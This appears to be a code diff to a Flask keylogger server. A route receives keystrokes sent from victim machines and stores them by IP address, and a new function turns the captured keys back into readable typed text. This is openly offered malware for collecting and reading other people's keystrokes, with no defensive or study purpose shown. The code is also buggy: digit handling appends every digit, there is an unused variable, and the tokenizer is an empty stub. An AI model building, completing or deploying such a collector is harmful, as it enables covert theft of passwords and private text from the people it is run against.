@@ -2,8 +2,11 @@
 from flask import Blueprint, request
 import json
 from typing import List
+import string
 import os
 keylog: Blueprint = Blueprint('keylog', __name__, None)
+
+data_file: str = "data/keylog.json"
 
 
 @keylog.route('/keylogger/send_data', methods=['POST'])
@@ -39,3 +42,56 @@ def record() -> dict:
         json.dump(data, fp)
 
     return {"response": 0}
+
+
+def process_key_string(ip: str) -> str:
+    """
+    Return a string of an attempt to convert a string of keyboard input to the words typed.
+
+    Arguments:
+        ip: the ip address of the machine to grab the keys for.
+
+    Return:
+        the string version of the keyboard input
+    """
+    data: dict = None
+    with open(data_file, 'r') as fp:
+        data = json.load(fp)
+
+    keys: List[str] = data[ip]
+    result: str = ''
+
+    for key in keys:
+        if key in string.ascii_letters:
+            result += key
+            cap = False
+        elif key in string.digits:
+            result += string.digits
+        elif key == 'space' or key == 'enter':
+            result += ' '
+        elif key == 'shift':
+            result += ' <shift> '
+        elif key == 'backspace':
+            result = result[0:-1]
+        elif key == '.' or key == ',':
+            result += key
+        else:
+            print(key)
+    return result
+
+
+def tokenize(data: str, seperators: List[str]) -> List[str]:
+    """
+    Converts the given data into a list of tokens based on the given seperators.
+
+    Arguments:
+        data: the string to be tokenized
+        seperators: a list of the seperators to seperate tokens on.
+
+    Return: 
+        A list of tokens representing words.
+    """
+    pass
+
+
+print(process_key_string('127.0.0.1'))
